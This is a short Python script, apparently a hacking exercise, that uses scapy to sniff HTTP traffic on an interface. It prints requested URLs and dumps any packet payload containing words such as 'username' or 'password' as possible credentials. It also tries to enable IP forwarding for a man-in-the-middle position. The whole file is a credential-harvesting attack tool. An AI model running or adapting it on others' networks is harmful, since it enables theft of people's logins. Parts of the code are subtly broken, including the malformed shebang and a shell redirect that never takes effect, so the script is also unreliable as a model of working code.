#!usr/bin/env python

import subprocess
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
from scapy.layers.http import HTTPResponse


def sniff(interface):
    # prn: allow us to specify a Callaback function
    # Callback: a function that will be called every time this function captures a packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "email", "name"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


# -------MAIN-------
# enabling port forwarding to allow packets flow trough the middle computer
subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
# here specify the interface you want to sniff from
sniff("eth0")